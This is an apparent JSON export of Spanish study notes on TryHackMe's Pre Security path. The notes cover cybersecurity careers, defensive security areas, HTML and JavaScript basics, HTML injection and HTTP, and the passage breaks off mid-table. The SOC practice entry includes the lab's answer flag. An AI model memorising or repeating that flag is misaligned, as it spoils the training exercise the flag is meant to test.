    "src": "content/Ciberseguridad/THM/0. Pre Career/1. Pre Security/1. Introduction to cybersecurity/3. Careers in Cyber/2. Analista de seguridad.md",
    "breadcrumb": "THM > 0. Pre Career > 1. Pre Security > 1. Introduction to cybersecurity > 3. Careers in Cyber",
    "content": ">*Responsable de mantener la seguridad de la informaci√≥n de la organizaci√≥n.*\n\nSon necesarios para construir las medidas de seguridad a lo largo de las organizaciones para proteger a las compa√±√≠as de ataques.\n\n-----------------------\n<h2>Responsabilidades</h2>\n- Trabajar con varios interesados para analizar la ciberseguridad.\n- Compilar reportes sobre la seguridad de las redes, documentar problemas de seguridad y tomar medidas en respuesta.\n- Desarrollar planes de seguridad.\n\n-------------------------\n<h2>Learning Paths</h2>\n- Pre Security\n- Cyber Security 101\n- SOC Level 1",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "5. Examinador Forense Digital",
    "path": "/apuntes/thm/0-pre-career/1-pre-security/1-introduction-to-cybersecurity/3-careers-in-cyber/5-examinador-forense-digital/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/1. Pre Security/1. Introduction to cybersecurity/3. Careers in Cyber/5. Examinador Forense Digital.md",
    "breadcrumb": "THM > 0. Pre Career > 1. Pre Security > 1. Introduction to cybersecurity > 3. Careers in Cyber",
    "content": ">*Responsable de usar la for√©nsica digital para investigar incidentes y cr√≠menes.*\n\nSi te gusta jugar a ser detective, puede que este sea tu trabajo perfecto. Metiendo a los criminales entre rejas y absolviendo a los inocentes.\n\n-----------------------------\n<h2>Responsabilidades</h2>\n- Recopile evidencia digital mientras observa los procedimientos legales\n- Analizar la evidencia digital para encontrar respuestas relacionadas con el caso\n- Documente sus hallazgos e informe sobre el caso",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "4. Respondedor de Incidentes",
    "path": "/apuntes/thm/0-pre-career/1-pre-security/1-introduction-to-cybersecurity/3-careers-in-cyber/4-respondedor-de-incidentes/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/1. Pre Security/1. Introduction to cybersecurity/3. Careers in Cyber/4. Respondedor de Incidentes.md",
    "breadcrumb": "THM > 0. Pre Career > 1. Pre Security > 1. Introduction to cybersecurity > 3. Careers in Cyber",
    "content": ">*Identifica y mitiga ataques mientras las operaciones de los atacantes son llevadas a cabo.*\n\nResponden de manera productiva y eficiente a las brechas de ciberseguridad. A menudo se trata de una posici√≥n muy presionada.\n\n------------------------\n<h2>Responsabilidades</h2>\n- Desarrollar y adoptar un plan de respuesta a incidentes exhaustivo y accionable.\n- Mantener las mejores pr√°cticas de seguridad s√≥lidas y respaldar las medidas de respuesta a incidentes.\n- Informes posteriores a incidentes y preparaci√≥n para futuros ataques, teniendo en cuenta los aprendizajes y adaptaciones que se deben extraer de los incidentes.\n\n----------------------------\n<h2>Learning Path</h2>\n- SOC Level 1",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "3. Ingeniero de seguridad",
    "path": "/apuntes/thm/0-pre-career/1-pre-security/1-introduction-to-cybersecurity/3-careers-in-cyber/3-ingeniero-de-seguridad/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/1. Pre Security/1. Introduction to cybersecurity/3. Careers in Cyber/3. Ingeniero de seguridad.md",
    "breadcrumb": "THM > 0. Pre Career > 1. Pre Security > 1. Introduction to cybersecurity > 3. Careers in Cyber",
    "content": ">*Dise√±a, monitoriza y mantiene los controles de seguridad, redes y sistemas para ayudar a prevenir ciberataques.*\n\nLos ingenieros de seguridad desarrollan e implementan las soluciones de seguridad utilizando datos de amenazas y vulnerabilidades, procedentes de miembros del personal habitualmente.\n\n------------------------\n<h2>Responsabilidades</h2>\n- Probar y examinar las medidas de seguridad en todo el software\n- Supervise las redes y los informes para actualizar los sistemas y mitigar las vulnerabilidades\n- Identifique e implemente los sistemas necesarios para una seguridad √≥ptima\n\n-----------------------------\n<h2>Learning Path</h2>\n- SOC Level 1\n- JR Penetration Tester\n- Offensive Pentesting",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "8. Red Teamer",
    "path": "/apuntes/thm/0-pre-career/1-pre-security/1-introduction-to-cybersecurity/3-careers-in-cyber/8-red-teamer/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/1. Pre Security/1. Introduction to cybersecurity/3. Careers in Cyber/8. Red Teamer.md",
    "breadcrumb": "THM > 0. Pre Career > 1. Pre Security > 1. Introduction to cybersecurity > 3. Careers in Cyber",
    "content": ">*Juega el rol de un adversario, atacando una organizaci√≥n y proveyendo feedback desde la perspectiva enemiga.*\n\nComparten similitudes con los pentesters pero con un rol laboral m√°s espec√≠fico. Requiere emular las acciones de los ciberdelincuentes incluso si estas no son siempre cibern√©ticas.\n\n---------------------\n<h2>Responsabilidades</h2>\n- Emule el papel de un actor de amenazas para descubrir vulnerabilidades explotables, mantener el acceso y evitar la detecci√≥n\n- Eval√∫e los controles de seguridad, la inteligencia de amenazas y los procedimientos de respuesta a incidentes de las organizaciones\n- Eval√∫e e informe sobre la informaci√≥n, con datos procesables para que las empresas eviten instancias del mundo real\n\n-------------\n<h2>Learning Path</h2>\n- JR Penetration Tester\n- Offensive Pentesting\n- Red Teamer",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "7. Penetration Tester",
    "path": "/apuntes/thm/0-pre-career/1-pre-security/1-introduction-to-cybersecurity/3-careers-in-cyber/7-penetration-tester/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/1. Pre Security/1. Introduction to cybersecurity/3. Careers in Cyber/7. Penetration Tester.md",
    "breadcrumb": "THM > 0. Pre Career > 1. Pre Security > 1. Introduction to cybersecurity > 3. Careers in Cyber",
    "content": ">*Responsable de testear productos tecnol√≥gicos en busca de agujeros de seguridad.*\n\nSu trabajo es probar la seguridad de las redes y el software de una compa√±√≠a.\n\n------------------\n<h2>Reponsabilidades</h2>\n- Realizar pruebas en sistemas inform√°ticos, redes y aplicaciones basadas en la web\n- Realizar evaluaciones de seguridad, auditor√≠as y analizar pol√≠ticas\n- Eval√∫e e informe sobre la informaci√≥n, recomendando acciones para la prevenci√≥n de ataques\n\n----------------------------\n<h2>Learning Path</h2>\n- JR Penetration Tester\n- Offensive Pentesting",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "6. Analista de Malware",
    "path": "/apuntes/thm/0-pre-career/1-pre-security/1-introduction-to-cybersecurity/3-careers-in-cyber/6-analista-de-malware/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/1. Pre Security/1. Introduction to cybersecurity/3. Careers in Cyber/6. Analista de Malware.md",
    "breadcrumb": "THM > 0. Pre Career > 1. Pre Security > 1. Introduction to cybersecurity > 3. Careers in Cyber",
    "content": ">*Analiza el tipo de malware para aprender m√°s sobre c√≥mo funcionan y lo que hacen.*\n\nEl trabajo de un analista de malware envuelve analizar programas sospechosos, descubrir lo que hacen y escribir reportes sobre sus hallazgos.\n\n-----------------------------\n<h2>Responsabilidades</h2>\n- Llevar a cabo¬†an√°lisis est√°ticos¬†de programas maliciosos, lo que implica ingenier√≠a inversa\n- Realizar¬†an√°lisis din√°micos¬†de muestras de malware mediante la observaci√≥n de sus actividades en un entorno controlado\n- Documentar e informar de todos los hallazgos",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "1. Introducci√≥n",
    "path": "/apuntes/thm/0-pre-career/1-pre-security/1-introduction-to-cybersecurity/3-careers-in-cyber/1-introduccion/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/1. Pre Security/1. Introduction to cybersecurity/3. Careers in Cyber/1. Introducci√≥n.md",
    "breadcrumb": "THM > 0. Pre Career > 1. Pre Security > 1. Introduction to cybersecurity > 3. Careers in Cyber",
    "content": "Las carreras en ciberseguridad se est√°n haciendo populares y siendo cada vez m√°s demandadas por los siguientes motivos:\n- Salario alto.\n- Excitante.\n- Altamente demandado.",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "2. Areas of Defensive Security",
    "path": "/apuntes/thm/0-pre-career/1-pre-security/1-introduction-to-cybersecurity/2-deffensive-security-intro/2-areas-of-defensive-security/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/1. Pre Security/1. Introduction to cybersecurity/2. Deffensive Security Intro/2. Areas of Defensive Security.md",
    "breadcrumb": "THM > 0. Pre Career > 1. Pre Security > 1. Introduction to cybersecurity > 2. Deffensive Security Intro",
    "content": "<h2>Security Operations Center (SOC)</h2>\nEs un equipo de profesionales de la ciberseguridad que monitorea la red y los sistemas para detectar eventos maliciosos. Algunas √°reas de inter√©s para los SOC son:\n- **Vulnerabilidades**: Esencial instalar el adecuado parche o actualizaci√≥n inmediatamente despu√©s de detectarla.\n- **Violaci√≥n de Pol√≠ticas**: Cuando se infringen el conjunto de reglas de seguridad en un sistema, por ejemplo, los usuarios del sistema comparten informaci√≥n privilegiada con agentes externos.\n- **Actividad no Autorizada**: Por ejemplo cuando las credenciales de un usuario son robadas. Se debe proceder a bloquear la intrusi√≥n de esa cuenta de inmediato.\n- **Intrusiones en la red**: Por muy buena que sea tu seguridad siempre hay una posibilidad de ser vulnerado. En esos momentos hay que actuar r√°pida y diligentemente.\n\n---------------------------------\n<h2>Threat Intelligence</h2>\n\nEn este contexto, inteligencia se refiere a la informaci√≥n que eres capaz de recolectar sobre amenazas/enemigos actuales y potenciales. Threat Intelligence ayuda a la empresa a prepararse mejor de cara a potenciales adversarios. Hay diferentes tipos de amenaza dependiendo de la empresa v√≠ctima. Por ejemplo podr√≠an intentar **robar** datos de una compa√±√≠a de tel√©fonos o **parar** la refinaci√≥n de petr√≥leo en una planta.\n\nPara esto necesitamos recolectar datos. Estos datos son recogidos de redes locales, logs de red y recursos p√∫blicos como foros. El procesamiento de datos los ordena en un formato analizable. La parte de an√°lisis busca obtener m√°s informaci√≥n sobre los atacantes/adversarios, sus t√©cnicas, t√°cticas y procedimientos.\n\n------------------------------\n<h2>Digital Forensics</h2>\nEs la aplicaci√≥n de la ciencia a la investigaci√≥n de cr√≠menes. Con la expansi√≥n de la tecnolog√≠a una nueva ciencia forense se alz√≥: Computer Forensics, que termin√≥ siendo Digital Forensics. La misi√≥n principal es analizar evidencia de los cr√≠menes y a sus perpetradores. \n\nPara ello nos centramos en:\n\n- File System: Analizando una copia a bajo nivel del sistema de archivos.\n- System Memory: Analizando la memoria del sistema a bajo nivel (copia).\n- System Logs: Analizando los logs del sistema.\n- Network Logs: Analizando los logs de la red y los paquetes enviados y recibidos.\n\n-------------------------------------------\n<h2>Incident Response</h2>\nUn incidente normalmente se refiere a una brecha de seguridad o una filtraci√≥n de informaci√≥n o ciberataque. De todas maneras, puede ser algo poco cr√≠tico como una mal configuraci√≥n, un intento de intrusi√≥n, etc. \n\nLas cuatro fases de la respuesta ante incidentes son:\n\n1. Preparaci√≥n: Requiere de un equipo entrenada listo para responder ante estos.\n2. Detecci√≥n y an√°lisis: El equipo tiene los recursos y herramientas necesarios para poder detectarlo a tiempo.\n3. Contenci√≥n, erradicaci√≥n y recuperaci√≥n: Una vez detectado hay que erradicarlo o en su defecto contenerlo. Adem√°s si es posible se debe intentar recuperar los datos.\n4. Actividad post-incidente: Despu√©s de una intrusi√≥n exitosa o no un informe debe de ser redactado.\n\n------------------------------\n<h2>Malware Analysis</h2>\nMalware significa Malicious Software. Son programas, documentos o archivos dise√±ados espec√≠ficamente para infectar equipos. Para aprender sobre ellos usan:\n\n- An√°lisis est√°tico: Miran el c√≥digo sin ejecutarlo.\n- An√°lisis din√°mico: Ejecutan el c√≥digo en entornos controlados.",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "3. Practical Example of Defensive Security",
    "path": "/apuntes/thm/0-pre-career/1-pre-security/1-introduction-to-cybersecurity/2-deffensive-security-intro/3-practical-example-of-defensive-security/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/1. Pre Security/1. Introduction to cybersecurity/2. Deffensive Security Intro/3. Practical Example of Defensive Security.md",
    "breadcrumb": "THM > 0. Pre Career > 1. Pre Security > 1. Introduction to cybersecurity > 2. Deffensive Security Intro",
    "content": "Escenario:\n>*Eres un analista SOC responsable de proteger un banco. El SOC del banco usa una herramienta SIEM (Security Information and Event Management) la cual recolecta informaci√≥n y eventos relacionados con la seguridad de varias fuentes y las presenta en una dashboard.*\n\n No todas las alertas son maliciosas, queda bajo responsabilidad del analista averiguar cuales son maliciosas. Por ejemplo, alertas por m√∫ltiples intentos de inicio de sesi√≥n, aunque sospechoso, no siempre es malicioso, pues esto pasa. \n O puede que haya una IP desconocida  intentando conectarse (sospechoso).\n\n1. !![[Pasted image 20250410193612.png]]\n\t1. IP sospechosa: 143.110.250.149\n2. ![[Pasted image 20250410193838.png]]\n3. ![[Pasted image 20250410193908.png]]\n\t1. Herramientas para comprobar IPs maliciosas:\n\t\t1. AbuselPDB\n\t\t2. Cisco Talos Intelligence\n4. ![[Pasted image 20250410194108.png]]\n5. ![[Pasted image 20250410194211.png]]\n6. THM{THREAT-BLOCKED}",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "0. Deffensive Security Intro",
    "path": "/apuntes/thm/0-pre-career/1-pre-security/1-introduction-to-cybersecurity/2-deffensive-security-intro/0-deffensive-security-intro/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/1. Pre Security/1. Introduction to cybersecurity/2. Deffensive Security Intro/0. Deffensive Security Intro.md",
    "breadcrumb": "THM > 0. Pre Career > 1. Pre Security > 1. Introduction to cybersecurity > 2. Deffensive Security Intro",
    "content": "[[1. Introduction to Defensive Security]]\n[[2. Areas of Defensive Security]]\n[[3. Practical Example of Defensive Security]]",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "1. Introduction to Defensive Security",
    "path": "/apuntes/thm/0-pre-career/1-pre-security/1-introduction-to-cybersecurity/2-deffensive-security-intro/1-introduction-to-defensive-security/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/1. Pre Security/1. Introduction to cybersecurity/2. Deffensive Security Intro/1. Introduction to Defensive Security.md",
    "breadcrumb": "THM > 0. Pre Career > 1. Pre Security > 1. Introduction to cybersecurity > 2. Deffensive Security Intro",
    "content": "En la p√°gina anterior aprendimos sobre [[1. What is Offensive Security]]. En esta lecci√≥n nos adentraremos un poco en la seguridad defensiva, la cual trata de:\n1. Prevenir intrusiones.\n2. Detectar intrusiones cuando ocurren y responder acorde.\n\nAlgunas de las tareas que realizan estos equipos son:\n1. Concienciaci√≥n de ciberseguridad a los usuarios.\n2. Documentar y manejar los sistemas/dispositivos.\n3. Actualizar y parchear sistemas.\n4. Configurar dispositivos de seguridad.\n5. Configurar dispositivos de monitorizaci√≥n.\n\nA parte de lo que cubriremos con estas, tambi√©n hay otras ramas ([[2. Areas of Defensive Security]]) como:\n1. Security Operations Center (SOC).\n2. Threat Intelligence.\n3. Digital Forensics and Incident Response (DFIR).\n4. Malware Analysis.",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "4. Sensitive Data Exposure",
    "path": "/apuntes/thm/0-pre-career/1-pre-security/3-how-the-web-works/3-how-websites-work/4-sensitive-data-exposure/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/1. Pre Security/3. How the Web Works/3. How Websites Work/4. Sensitive Data Exposure.md",
    "breadcrumb": "THM > 0. Pre Career > 1. Pre Security > 3. How the Web Works > 3. How Websites Work",
    "content": "La exposici√≥n de informaci√≥n sensible ocurre cuando un sitio web no proteje (o elimina) correctamente la informaci√≥n sensible en texto claro.\n\nAhora sabemos que la p√°ginas web est√°n construidas usando varias etiquetas que podemos ver buscando en el c√≥digo fuente. Es posible que un desarrollador web se haya olvidado de eliminar credenciales o links privados.\n\nLa informaci√≥n sensible puede ser usada por el atacante para llevar el ataque m√°s all√° en la aplicaci√≥n web. Al rematar el trabajo de desarrollo de una web lo primero que hay que hacer es revisar el c√≥digo fuente.\n\n1. ![[020.png]]\n2. ![[019.png]]",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "0. How Websites Work",
    "path": "/apuntes/thm/0-pre-career/1-pre-security/3-how-the-web-works/3-how-websites-work/0-how-websites-work/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/1. Pre Security/3. How the Web Works/3. How Websites Work/0. How Websites Work.md",
    "breadcrumb": "THM > 0. Pre Career > 1. Pre Security > 3. How the Web Works > 3. How Websites Work",
    "content": "[[1. How websites work]]\n[[2. HTML]]\n[[3. JavaScript]]\n[[4. Sensitive Data Exposure]]\n[[5. HTML Injection]]",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "5. HTML Injection",
    "path": "/apuntes/thm/0-pre-career/1-pre-security/3-how-the-web-works/3-how-websites-work/5-html-injection/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/1. Pre Security/3. How the Web Works/3. How Websites Work/5. HTML Injection.md",
    "breadcrumb": "THM > 0. Pre Career > 1. Pre Security > 3. How the Web Works > 3. How Websites Work",
    "content": "Es una vulnerabilidad que ocurre cuando el input de un usuario no filtrado se muestra en la web. Si un sitio falla al sanitizar el input de un usuario, y ese input es usado en la p√°gina web, entonces el usuario puede inyectar c√≥digo HTML.\n\nCuando un usuario tiene el control sobre c√≥mo su input se ense√±a, puede subir HTML o JS y el buscador lo usar√° en la p√°gina, pudiendo cambiar as√≠ la apariencia y funcionalidad.\n\n![[021.png]]\n\nLa imagen de arriba muestra c√≥mo una form se outputea en la web. Cualquier cosa que el usuario introduce se usa en la funci√≥n sayHi.\n\nLa regla general es nunca fiarse del input del usuario. Adem√°s sanitizar los inputs antes de meterlo en una funci√≥n.",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "3. JavaScript",
    "path": "/apuntes/thm/0-pre-career/1-pre-security/3-how-the-web-works/3-how-websites-work/3-javascript/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/1. Pre Security/3. How the Web Works/3. How Websites Work/3. JavaScript.md",
    "breadcrumb": "THM > 0. Pre Career > 1. Pre Security > 3. How the Web Works > 3. How Websites Work",
    "content": "JavaScript es uno de los lenguajes de programaci√≥n m√°s famosos en el mundo y permite a las p√°ginas ser interactivas. HTML es usado para crear la estructura y el contenido de las p√°ginas, mientras que JS es usado para controlar la funcionalidad de las p√°ginas web. Sin JS, una p√°gina no podr√≠a tener elementos interactivos y siempre ser√≠a est√°tica. JS actualiza la p√°gina en tiempo real lo que significa que se puede modificar el HTML en eventos concretos, como pulsar alg√∫n bot√≥n o rellenar un formulario.\n\nJS es a√±adido a la p√°gina en el c√≥digo fuente y puede estar incluido bien dentro de la etiqueta `<script></script>` o bien de manera remota desde otro documento usando el atributo *src*: `<script src=\"/location/of/javascript_file.js\"></script>`.\n\nEl siguiente c√≥digo JS encuentra un elemento HTML en la p√°gina con id *\"demo\"* y cambia el contenido del elemento a *\"Hack the Planet\"*:\n\n```js\ndocument.getElementById(\"demo\").innerHTML = \"Hack the Planet\"\n```\n\nLos elementos HTML tambi√©n pueden tener eventos como *\"onclick\"* u *\"onhover\"* que ejecutan el JS cuando ocurre el evento. El siguiente c√≥digo cambia el texto en el elemento con id *\"demo\"* a un bot√≥n:\n\n```js\n<button onclick='document.getElementById(\"demo\").innerHTML = \"Button Clicked\";'>Click Me!</button>\n```",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "2. HTML",
    "path": "/apuntes/thm/0-pre-career/1-pre-security/3-how-the-web-works/3-how-websites-work/2-html/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/1. Pre Security/3. How the Web Works/3. How Websites Work/2. HTML.md",
    "breadcrumb": "THM > 0. Pre Career > 1. Pre Security > 3. How the Web Works > 3. How Websites Work",
    "content": "Las p√°ginas web son creadas, principalmente, usando:\n\n- HTML, para construir webs y definir su estructura.\n- CSS, para hacer que las webs se vean bonitas a√±adiendo opciones de estilos.\n- JavaScript, implementa funciones complejas usando la interactividad.\n\nHyperText Markup Language (HTML) es el lenguaje en el que se escriben las p√°ginas. Los elemenos o etiquetas (tags) son los bloques que construyen las p√°ginas. Un c√≥digo sencillo:\n\n```html\n<!DOCTYPE html>\n<html>\n\t<head>\n\t\t<title>Page Title</title>\n\t</head>\n\t<body>\n\t\t<h1>Ejemplo de Cabecera</h1>\n\t\t<p>Ejemplo de p√°rrafo.</p>\n\t</body>\n</html>\n```\n\nLa estructura HTML consta de los siguientes componentes:\n\n- El encabezado `<!DOCTYPE html>` indica que la p√°gina es un documento html5.\n- La etiqueta `<html>` es el elemento ra√≠z de la p√°gina HTML.\n- La etiqueta `<head>` contiene informaci√≥n sobre la p√°gina, como el t√≠tulo.\n- La etiqueta `<body>` define el cuerpo principal ldel documento HTML. S√≥lo lo que est√° dentro del cuerpo se muestra en el buscador.\n- La etiqueta `<h1>` es el encabezado m√°s grande. Existen hasta el `<h6>`.\n- La etiqueta `<p>` define un p√°rrafo.\n- Hay m√°s elementos para diferentes finalidades como `<button>`, `<img>` o `<form>`.\n\nLas etiquetas contienen atributos como *class* que sirve para cambiar el color por ejemplo `<p class=\"bold-text\">` o el atributo *src* para especificar localizaci√≥n del enlace (usado en fotos) `img src=\"img/cat.jpg\">`. Un elemento puede tener varios atributos: `<p atributo1=\"valor1\" atributo2=\"valor2\">`.\n\nLos elementos tambi√©n pueden tener un atributo id `<p id=\"ejemplo\">`, el cual es √∫nico para cada elemento. Al contrario que el atributo clase, el cual puede pertenecer el mismo a varios elementos. Estos id's son usados para los estilos y para que JavaScript identifique los elementos.",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "1. How websites work",
    "path": "/apuntes/thm/0-pre-career/1-pre-security/3-how-the-web-works/3-how-websites-work/1-how-websites-work/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/1. Pre Security/3. How the Web Works/3. How Websites Work/1. How websites work.md",
    "breadcrumb": "THM > 0. Pre Career > 1. Pre Security > 3. How the Web Works > 3. How Websites Work",
    "content": "Cuando visitamos una p√°gina web, el servidor hace una petici√≥n al servidor web preguntando por informaci√≥n de la p√°gina que estamos visitando. Este responder√° con la informaci√≥n que el buscador usa para mostrarte la p√°gina. Un servidor web es un ordenador dedicado que maneja tus peticiones.\n![[018.png]]\nHay dos componentes principales que forman un sitio web:\n\n- Front End (Client-Side): La forma en la que un buscador renderiza el sitio web.\n- Back End (Server-Side): Un servidor que procesa tu petici√≥n y devuelve una respuesta.\n\nHay muchos procesos que toman parte en tu buscador haciendo una petici√≥n al servidor.",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "1. What is HTTP(S)",
    "path": "/apuntes/thm/0-pre-career/1-pre-security/3-how-the-web-works/2-http-in-detail/1-what-is-http-s/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/1. Pre Security/3. How the Web Works/2. HTTP in Detail/1. What is HTTP(S).md",
    "breadcrumb": "THM > 0. Pre Career > 1. Pre Security > 3. How the Web Works > 2. HTTP in Detail",
    "content": "<h2>¬øQu√© es HTTP?</h2>\n\nHyperText Transfer Protocol es un protocolo usado cuando visitas una p√°gina web. Desarrollado por Tim Berners-Lee y su equipo entre 1989-1991. HTTP es un set de reglas usadas para comunicarse cn los servidores web para transmitir la informaci√≥n de la web, im√°genes, v√≠deos, etc.\n\n-----------------------------\n<h2>¬øQu√© es HTTPS?</h2>\nHiperText Transfer Protocol Secure es la versi√≥n segura de HTTP. Encripta la informaci√≥n de tal manera que no s√≥lo para los intentos de terceros de leerla sino tambi√©n te da seguridad de que el servidor al que le est√°s hablando es leg√≠timo.",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "2. Requests and Responses",
    "path": "/apuntes/thm/0-pre-career/1-pre-security/3-how-the-web-works/2-http-in-detail/2-requests-and-responses/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/1. Pre Security/3. How the Web Works/2. HTTP in Detail/2. Requests and Responses.md",
    "breadcrumb": "THM > 0. Pre Career > 1. Pre Security > 3. How the Web Works > 2. HTTP in Detail",
    "content": "Cuando accedemos a una web, el buscador necesitar√° hacer peticiones al servidor web para descargar activos como HTML, im√°genes o v√≠deos. Primero necesitas decirle al buscador d√≥nde y c√≥mo acceder a estos recursos. A ello ayudan las URL's.\n\n---------------------------------\n<h2>¬øQu√© es una URL?</h2>\nUna URL es una instrucci√≥n de como acceder a un recurso en internet.\n\n![[015.png]]\n- Scheme: Indica qu√© protocolo utilizar.\n- User: Algunos servicios requieren autentificaci√≥n.\n- Host: Nombre de dominio o direcci√≥n IP del servidor al que deseas acceder.\n- Port: Puerto al que te vas a conectar (80 para HTTP).\n- Path: Nombre del archivo o ruta del recurso al que vas a acceder.\n- Query String: Bits extra de informaci√≥n que mandas al path. Por ejemplo, blog?id=1.\n- Fragment: Referencia a la localizaci√≥n de la p√°gina pedida.\n\n-------------------------------\n<h2>Haciendo una petici√≥n</h2>\nEs posible hacer una petici√≥n al servidor con s√≥lo una l√≠nea GET / HTTP/1.1:\n\n![[016.png]]\nPero para una experiencia m√°s rica en la web, necesitamos mandar otra informaci√≥n tambi√©n. Esta se manda en lo que se conoce como headers. Un ejemplo de petici√≥n:\n\n```vb.net\nGET / HTTP/1.1\nHost: tryhackme.com\nUser-Agent: Mozilla/5.0 Firefox/87.0\nReferer: https://tryhackme.com/\n\n```\n\n1. L√≠nea 1: Esta petici√≥n manda el m√©todo GET, pidiendo la p√°gina home con \"/\" y diciedo que usa el protocolo HTTP en la versi√≥n 1.1\n2. L√≠nea 2: Le decimos al servidor web que queremos la web tryhackme.com\n3. L√≠nea 3: Le decimos al servidor web que usamos el buscador Firefox en su versi√≥n 87\n4. L√≠nea 4: Le decimos al servidor que la p√°gina web que nos dirigi√≥ a esta fue https://tryhackme.com\n5. L√≠nea 5: Las peticiones HTTP finalizan con una l√≠nea en blanco para indicarle al servidor que la petici√≥n ha terminado.\n\n--------------------------\n<h2>Recibiendo una respuesta</h2>\nEjemplo de respuesta:\n\n```vb.net\nHTTP/1.1 200 OK\nServer: nginx/1.15.8\nDate: Fri, 09 Apr 2021 13:34:03 GTM\nContent-Type: text/html\nContent-Length: 98\n\n<html>\n\t<head>\n\t\t<title>TryHackMe</title>\n\t</head>\n\t<body>\n\t\tWelcome To TryHackMe.com\n\t</body>\n</html>\n\n```\n\n1. L√≠nea 1: HTTP 1.1 es la versi√≥n del protocolo HTTP que el servidor est√° usando seguida del c√≥digo de estado HTTP, en este caso \"200 OK\" que nos indica que se ha completado de manera existosa.\n2. L√≠nea 2: Esto nos dice el software del servidor web y la versi√≥n.\n3. L√≠nea 3: La fecha actual, tiempo y zona horaria del servidor.\n4. L√≠nea 4: Los headers content-type le indica al cliente el tipo de informaci√≥n que ser√° mandada (HTML, im√°genes, v√≠deos, pdf, XML...).\n5. L√≠nea 5: El header content-length le indica al cliente c√≥mo de larga la respuesta es. De esta manera podemos confirmar que no falta informaci√≥n.\n6. L√≠nea 6: La respuesta HTTP contiene una l√≠nea en blanco para indicar que la respuesta ha terminado.\n7. L√≠nea 7-14: La informaci√≥n que ha sido pedida, en este caso la p√°gina home.",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "6. Cookies",
    "path": "/apuntes/thm/0-pre-career/1-pre-security/3-how-the-web-works/2-http-in-detail/6-cookies/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/1. Pre Security/3. How the Web Works/2. HTTP in Detail/6. Cookies.md",
    "breadcrumb": "THM > 0. Pre Career > 1. Pre Security > 3. How the Web Works > 2. HTTP in Detail",
    "content": "Seguramente hayas o√≠do hablar de cookies antes. Son una peque√±a pieza de informaci√≥n qye est√° guardada en tu ordenador. Son guardadas cuando recibes un Set-Cookie header de un servidor web. Despu√©s, cada petici√≥n que hagas mandar√° la cookie de vuelta al servidor. Ya que HTTP es statekless y no guarda informaci√≥n sobre tus peticioines previas, la cookie se manda para ayudar al servidor a recordar qui√©n eres.\n\n![[017.png]]\nLas cookies pueden ser usadas oara muchos prop√≥sitos pero son comunmente m√°s usadas para autentificarse de cara a un servidor. La cookie, de todas formas, no ser√° un texto claro, sino una string encriptada.\n\nPuedes f√°cilmente ver qu√© cookies el servidor est√° mandando a la p√°gina web usando las herramientas de desarrollador (F12). Una vez all√≠ te diriges a \"Network\".",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "4. HTTP Status Codes",
    "path": "/apuntes/thm/0-pre-career/1-pre-security/3-how-the-web-works/2-http-in-detail/4-http-status-codes/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/1. Pre Security/3. How the Web Works/2. HTTP in Detail/4. HTTP Status Codes.md",
    "breadcrumb": "THM > 0. Pre Career > 1. Pre Security > 3. How the Web Works > 2. HTTP in Detail",
    "content": "<h2>C√≥digos de estado HTTP</h2>\nEn la lecci√≥n anterior ([[3. HTTP Methods]]) hemos visto que la primera l√≠nea de la respuesta contiene un c√≥digo que le indica al cliente el estado de la petici√≥n. Estos c√≥digos pueden descomponerse en 5 secciones:\n\n| Rango                              | Descripci√≥n                                                                                                                           |\n| ---------------------------------- | ------------------------------------------------------------------------------------------------------------------------------------- |\n| **100-199 - Information Response** | Sirven para decirle al cliente que la primera parte de su petici√≥n ha sido procesada correctamente y que necesitan seguir envi√°ndola. |\n| **200-299 - Success**              | Usado para indicarle al cliente que su petici√≥n fue exitosa.                                                                          |\n| **300-399 - Redirection**          | Estos son usados para redirigir al cliente a otro recurso.                                                                            |\n| **400-499 - Client Errors**        | Informa al cliente de que hubo un error durante su petici√≥n.                                                                          |\n| **500-599 - Server Errors**        | Reservado a los errores del lado del servidor.                                                                                        |\n\n----------------------\n<h2>C√≥digos de estado HTTP comunes</h2>\nHay muchos c√≥digos de estado HTTP, y eso sin incluir que las p√°ginas pueden crear los suyos propios. Algunos de los m√°s comunes son:\n\n| Respuesta                        | Descripci√≥n                                                                                                   |\n| -------------------------------- | ------------------------------------------------------------------------------------------------------------- |\n| **200 - OK**                     | Completado exitosamente.                                                                                      |\n| **201 - Created**                | Un 